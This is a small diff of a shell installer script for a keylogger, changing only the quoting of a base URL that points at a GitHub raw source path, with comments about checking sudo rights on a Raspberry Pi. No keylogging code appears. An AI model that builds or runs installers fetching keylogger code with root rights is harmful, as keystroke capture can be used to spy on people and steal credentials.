@@ -2,7 +2,7 @@
 # application to install, setup, and run the keylogger.
 
 # entry point:
-base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/
+base="https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/"
 
 # CHECK THAT USER CAN ISSUE SUDO
 # Totally expects the root user to be an unchanged Raspberry Pi
